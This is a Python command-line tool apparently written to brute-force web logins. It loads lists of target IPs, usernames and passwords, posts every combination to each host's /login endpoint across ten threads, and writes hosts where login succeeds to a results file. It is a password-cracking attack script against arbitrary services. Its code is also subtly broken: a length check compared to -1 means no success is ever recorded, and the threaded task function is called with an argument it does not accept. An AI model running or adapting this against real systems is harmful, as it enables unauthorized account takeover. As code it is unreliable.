import os
import requests as req
import json
import typer
from rich.progress import Progress
import concurrent.futures


class Crack:
    def read_file(self, path: str):
        if os.path.exists(path):
            with open(path, "r+") as file:
                result = file.readlines()
                result = list(map(lambda x: x.removesuffix("\n"), result))
                result = list(set(result))
            return result
        else:
            return []

    def save_cracked(self, data, path_cracked):
        if os.path.exists("result"):
            with open("result/" + path_cracked, "a+", encoding="utf-8") as file:
                file.writelines(data)
        else:
            os.mkdir("result")
            self.save_cracked(data, path_cracked)

    def crack(
        self,
        path_ip_list: str,
        path_userlist: str,
        path_passwordlist: str,
        path_cracked: str,
    ):
        ip_list = self.read_file(path_ip_list)
        ip_list = list(set(ip_list))
        cracked = []
        with Progress() as progress:
            def task():
                old_ip = self.read_file("result/"+path_cracked)
                passwordlist = self.read_file(path_passwordlist)
                usernamelist = self.read_file(path_userlist)
                error = False
                success_login = 0
                # typer.secho(f"\nCracked: {success_login}\n", fg=typer.colors.CYAN)
                ips_task = progress.add_task("[green]ip list ", total=len(ip_list))
                username_task = progress.add_task("[white]usernames ", total=len(usernamelist))
                password_task = progress.add_task("[red]passwords ", total=len(passwordlist))
            
                for ip in ip_list:
                    success = False
                    for usename in usernamelist:
                        for password in passwordlist:
                            try:
                                data = {"username": usename, "password": password}
                                response = req.post(
                                    url=ip + "/login", data=data, timeout=30
                                )
                                json_data = json.loads(response.text)
                                if json_data["success"]:

                                    find = list(
                                        filter(lambda x: x.find(ip) > -1, old_ip)
                                    )
                                    if len(find) == -1:
                                        cracked.append(
                                            ip + f" => password => {password}\n"
                                        )
                                        success = True
                                        success_login += 1
                                        old_ip.append(ip)
                                        break
                            except:
                                self.save_cracked(cracked, path_cracked)
                                cracked.clear()
                                error = True
                                typer.clear()
                                break
                            progress.update(password_task,advance=1)
                        progress.update(username_task,advance=1)
                        if success or error:
                            break
                    progress.update(ips_task,advance=1)        
                            
                    
                    # typer.secho(f"\nCracked: {success_login}\n", fg=typer.colors.CYAN)
            self.save_cracked(cracked, path_cracked)
            typer.secho("\nend", fg=typer.colors.GREEN)
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(task, ip_list)
